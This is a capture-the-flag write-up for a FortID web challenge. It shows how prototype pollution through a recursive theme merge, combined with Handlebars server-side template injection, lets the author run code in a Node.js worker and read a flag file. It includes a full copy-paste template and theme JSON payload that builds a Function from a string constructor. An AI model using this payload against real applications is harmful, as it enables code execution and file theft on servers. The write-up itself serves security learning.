# Do You Know Lika?

| Field | Value |
|---|---|
| Platform | FortID CTF |
| Category | Web |
| Status | Solved locally and on the hosted instance |
| Flag | Omitted |

## Challenge overview

The application is a postcard preview service. It accepts a Handlebars template together with JSON objects for the postcard theme and model, then renders the result in a fresh Node.js worker.

## Source-code observations

The browser sends the following fields to `POST /api/preview`:

- `template` - user-controlled Handlebars source;
- `theme` - a JSON object merged recursively by the worker;
- `model` - postcard data used during rendering.

The worker contains several details that are important together:

1. `mergeTheme()` recursively copies properties and reuses an existing value with `target[key] ??= ...`.
2. The merge does not limit itself to ordinary own data properties. JavaScript prototype-chain names can therefore affect the result.
3. The custom `setLayoutOption` helper is supposed to allow only `title`, `accent` and `caption`.
4. Its allow-list is a normal JavaScript object, so inherited properties can influence the permission check.
5. The worker is started with explicit read permission for `/tmp/lika/flag.txt`.

The direct `__proto__` spelling is filtered by the server, so the useful route is not a trivial JSON `__proto__` payload. The interesting path is the interaction between recursive merging, inherited properties and the Handlebars object lookup rules.

## What to submit

Open the challenge instance, paste the following into the three fields, and press **Send to print worker**.

### Postcard template

```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.getBuiltinModule('fs').readFileSync(process.env.FLAG_PATH, 'utf8')"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

### Theme JSON

```json
{
  "constructor": {
    "prototype": {
      "allowedProtoMethods": {
        "constructor": true,
        "split": true,
        "pop": true,
        "push": true,
        "sub": true,
        "apply": true
      },
      "allowedProtoProperties": {
        "constructor": true
      }
    }
  }
}
```

### Postcard data JSON

```json
{
  "title": "Lika",
  "message": "Greetings from the trail"
}
```

The response appears in the preview result. The flag itself is intentionally omitted from this repository.

The complete copy-paste payload and a line-by-line explanation are in [`exploit.md`](exploit.md).

## Reasoning and exploitation path

I first tested the normal preview request to separate application errors from the vulnerable behaviour. The server returned rendered HTML, confirming that the worker and template engine were functioning.

Next I compared the input validation with the worker implementation. The server filters a few obvious Handlebars constructs and rejects `__proto__`, but it still permits a user-controlled template and nested JSON objects. The recursive merge creates an opportunity to influence inherited properties without using the rejected spelling directly.

The allow-list check in `setLayoutOption` was the next important clue. Because the check uses an ordinary object, changing what the worker sees through the prototype chain can make a property appear writable even when it is not an own property of the allow-list. The theme object above places the Handlebars prototype permissions on that chain, enabling the methods needed by the template.

Finally, the worker's permission arguments explain what the challenge expects after the template-engine escape: the process may read the flag file, but the parent application does not expose that file through a normal HTTP route. The template obtains a string method's `constructor`, builds a callable function from it, and supplies the body `return process.getBuiltinModule('fs').readFileSync(process.env.FLAG_PATH, 'utf8')`. The worker executes that function and returns the file contents in the preview response. I verified this locally and then sent the same request to the hosted endpoint, which returned the actual flag.

## Lessons

The vulnerability is not simply that the application accepts HTML. It is the combination of:

- server-side template evaluation of user-controlled input;
- recursive merging of attacker-controlled objects;
- prototype inheritance affecting security checks;
- a worker with narrowly scoped file-read access.

This is why reading both the HTTP handler and the worker was necessary. Looking only at the visible postcard page would show the input fields, but not the prototype-chain and permission boundary that made the exploit possible.
